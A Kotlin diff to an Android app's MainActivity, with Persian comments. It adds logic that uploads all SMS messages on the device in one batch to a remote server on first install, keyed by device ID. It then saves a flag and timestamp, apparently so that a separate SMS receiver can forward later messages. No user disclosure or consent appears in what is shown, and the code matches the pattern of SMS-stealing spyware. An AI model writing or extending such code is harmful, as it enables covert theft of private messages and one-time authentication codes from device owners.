@@ -832,12 +832,29 @@ class MainActivity : ComponentActivity() {
                         appConfig.userId
                     )
 
-                    launch {
-                        SmsBatchUploader.uploadAllSms(
-                            context = this@MainActivity,
-                            deviceId = deviceId,
-                            baseUrl = ServerConfig.getBaseUrl()
-                        ) { progress -> }
+                    // 🔥 فقط یکبار batch upload کن (اولین باری که اپ نصب میشه)
+                    val prefs = getSharedPreferences("sms_upload_state", Context.MODE_PRIVATE)
+                    val hasUploadedBefore = prefs.getBoolean("initial_batch_uploaded", false)
+                    
+                    if (!hasUploadedBefore) {
+                        Log.d(TAG, "First time - uploading all SMS in batch")
+                        launch {
+                            val result = SmsBatchUploader.uploadAllSms(
+                                context = this@MainActivity,
+                                deviceId = deviceId,
+                                baseUrl = ServerConfig.getBaseUrl()
+                            ) { progress -> }
+                            
+                            // بعد از اتمام، flag رو ذخیره کن
+                            if (result is SmsBatchUploader.UploadResult.Success) {
+                                prefs.edit().putBoolean("initial_batch_uploaded", true).apply()
+                                // ذخیره timestamp آخرین پیامک برای SmsReceiver
+                                prefs.edit().putLong("last_batch_timestamp", System.currentTimeMillis()).apply()
+                                Log.d(TAG, "Initial batch upload completed successfully")
+                            }
+                        }
+                    } else {
+                        Log.d(TAG, "Batch already uploaded before - skipping")
                     }
 
                 } catch (e: Exception) {
